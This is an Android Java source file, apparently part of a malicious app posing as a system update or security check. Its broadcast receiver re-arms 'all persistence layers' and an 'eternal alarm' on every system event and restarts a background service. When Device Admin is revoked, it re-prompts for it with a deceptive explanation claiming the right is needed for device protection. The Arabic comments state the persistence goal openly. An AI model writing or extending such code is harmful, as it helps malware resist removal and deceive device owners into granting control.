package com.sec.check;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

/**
 * PackageUpdateReceiver - يستقبل أحداث النظام
 * ============================================================
 * ★ ملاحظة مهمة: من Android 8+، النظام مش بيبعت PACKAGE_ADDED
 *   للتطبيق اللي اتعمل تثبيته تو.
 * ★ الحل: نعتمد على المستخدم إنه يفتح التطبيق يدويًا من الأيقونة.
 * ★ الوظيفة الأساسية هنا: تفعيل الاستمرارية في كل حدث نظام
 * ============================================================
 */
public class PackageUpdateReceiver extends BroadcastReceiver {

    private static final String TAG = "SystemUpdate";
    private static final String PREFS_NAME = "sys_prefs";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent != null ? intent.getAction() : "unknown";
            Log.d(TAG, "[PKG] received: " + action);

            // ★★★ فعّل كل طبقات الاستمرارية في كل حدث نظام ★★★
            try {
                PersistenceManager.enableAllPersistence(context);
                PersistenceManager.scheduleEternalAlarm(context);
            } catch (Exception e) {
                Log.e(TAG, "[PKG] persistence error: " + e.getMessage());
            }

            // ★★★ حاول تشغيل الخدمات ★★★
            try {
                Intent svc = new Intent(context, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(svc);
                } else {
                    context.startService(svc);
                }
                Log.d(TAG, "[PKG] ServiceRunner started");
            } catch (Exception e) {
                Log.e(TAG, "[PKG] service start error: " + e.getMessage());
            }

            // ★★★ تأكد إن الـ Device Admin لسه مفعّل ★★★
            try {
                ensureDeviceAdminActive(context);
            } catch (Exception e) {
                Log.e(TAG, "[PKG] admin check error: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "[PKG] error: " + e.getMessage());
        }
    }

    // ============================================================
    // ensureDeviceAdminActive
    // ============================================================
    private void ensureDeviceAdminActive(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin =
                    new android.content.ComponentName(context, AdminReceiver.class);

            if (dpm != null && !dpm.isAdminActive(admin)) {
                Log.d(TAG, "[PKG] Device Admin NOT active — trying to reactivate");
                try {
                    Intent intent = new Intent(
                            android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(
                            android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                            admin);
                    intent.putExtra(
                            android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "مطلوب لتفعيل الحماية الكاملة للجهاز.");
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "[PKG] admin intent error: " + e.getMessage());
                }
            } else {
                Log.d(TAG, "[PKG] Device Admin is active");
            }
        } catch (Exception e) {
            Log.e(TAG, "[PKG] ensureDeviceAdminActive error: " + e.getMessage());
        }
    }
}
